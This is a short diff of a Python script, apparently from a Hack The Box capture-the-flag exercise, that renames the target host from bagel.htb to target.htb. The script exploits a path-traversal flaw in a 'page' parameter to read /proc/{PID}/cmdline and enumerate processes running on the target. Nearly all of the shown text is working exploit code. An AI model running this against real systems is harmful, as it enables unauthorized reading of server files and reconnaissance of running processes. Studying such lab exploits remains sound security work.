@@ -4,7 +4,7 @@ import threading
 thread_list = []
 
 def call(PID):
-    url = "http://bagel.htb:8000/?page=../../../../../../../"    
+    url = "http://target.htb:8000/?page=../../../../../../../"    
     payload = "/proc/{}/cmdline".format(PID)
     resp = requests.get(url + payload).text
     if (not "not found" in resp) and (resp.strip() != ""):
